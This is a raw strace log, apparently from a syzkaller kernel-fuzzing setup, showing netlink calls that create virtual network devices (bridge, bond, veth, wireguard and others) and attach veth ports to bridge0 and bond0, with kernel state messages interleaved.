[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;syz_tun&quot;, ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=48, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x00\x00\x00\x0b\x00\x00\x00\x80\x00\x00\x00\x08\x00\x01\x00\xac\x14\x14\xbb\x0a\x00\x02\x00\xbb\xaa\xaa\xaa\xaa\xaa\x00\x00&quot;], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;syz_tun&quot;, ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x00\x00\x00\x0b\x00\x00\x00\x80\x00\x00\x00\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbb\x0a\x00\x02\x00\xbb\xaa\xaa\xaa\xaa\xaa\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x1c /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;syz_tun&quot;, ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\xaa\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(3)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 3
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x03\x00\x69\x70\x36\x67\x72\x65\x74\x61\x70\x30\x00\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x69\x70\x36\x67\x72\x65\x74\x61\x70\x00\x00\x00&quot;], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x62\x72\x69\x64\x67\x65\x30\x00\x10\x00\x12\x00\x0a\x00\x01\x00\x62\x72\x69\x64\x67\x65\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x76\x63\x61\x6e\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x76\x63\x61\x6e&quot;], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x62\x6f\x6e\x64\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x62\x6f\x6e\x64&quot;], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x74\x65\x61\x6d\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x74\x65\x61\x6d&quot;], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x03\x00\x64\x75\x6d\x6d\x79\x30\x00\x00\x10\x00\x12\x00\x09\x00\x01\x00\x64\x75\x6d\x6d\x79\x00\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x03\x00\x6e\x6c\x6d\x6f\x6e\x30\x00\x00\x10\x00\x12\x00\x09\x00\x01\x00\x6e\x6c\x6d\x6f\x6e\x00\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x03\x00\x63\x61\x69\x66\x30\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x63\x61\x69\x66&quot;], 56, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 56
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=56, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x62\x61\x74\x61\x64\x76\x30\x00\x10\x00\x12\x00\x0a\x00\x01\x00\x62\x61\x74\x61\x64\x76\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x03\x00\x76\x78\x63\x61\x6e\x31\x00\x00\x10\x00\x12\x00\x09\x00\x01\x00\x76\x78\x63\x61\x6e\x00\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x03\x00\x77\x67\x30\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x03\x00\x77\x67\x31\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
syzkaller login: [   75.798678][ T5086] chnl_net:caif_netlink_parms(): no params data found
[pid  5086] sendto(3, [{nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x03\x00\x77\x67\x32\x00\x14\x00\x12\x00\x0d\x00\x01\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00&quot;], 60, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 60
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=60, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x72\x69\x64\x67\x65\x5f\x73\x6c\x61\x76\x65\x5f\x30\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x62\x72\x69\x64\x67\x65\x00&quot;], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x03\x00\x62\x72\x69\x64\x67\x65\x5f\x73\x6c\x61\x76\x65\x5f\x31\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x62\x72\x69\x64\x67\x65\x00&quot;], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge_slave_0&quot;, ifr_ifindex=29}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge0&quot;, ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0d\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge_slave_1&quot;, ifr_ifindex=31}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bridge0&quot;, ifr_ifindex=13}) = 0
[pid  5086] close(4)                    = 0
[   75.894184][ T5086] bridge0: port 1(bridge_slave_0) entered blocking state
[   75.902350][ T5086] bridge0: port 1(bridge_slave_0) entered disabled state
[   75.911279][ T5086] bridge_slave_0: entered allmulticast mode
[   75.918222][ T5086] bridge_slave_0: entered promiscuous mode
[   75.935062][ T5086] bridge0: port 2(bridge_slave_1) entered blocking state
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0d\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x62\x6f\x6e\x64\x5f\x73\x6c\x61\x76\x65\x5f\x30\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x74\x6f\x5f\x62\x6f\x6e\x64\x00\x00\x00&quot;], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x03\x00\x62\x6f\x6e\x64\x5f\x73\x6c\x61\x76\x65\x5f\x31\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x74\x6f\x5f\x62\x6f\x6e\x64\x00\x00\x00&quot;], 104, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 104
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=104, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond_slave_0&quot;, ifr_ifindex=33}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond0&quot;, ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[   75.942454][ T5086] bridge0: port 2(bridge_slave_1) entered disabled state
[   75.949701][ T5086] bridge_slave_1: entered allmulticast mode
[   75.956605][ T5086] bridge_slave_1: entered promiscuous mode
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0f\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond_slave_1&quot;, ifr_ifindex=35}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;bond0&quot;, ifr_ifindex=15}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x23\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x0a\x00\x0f\x00\x00\x00&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
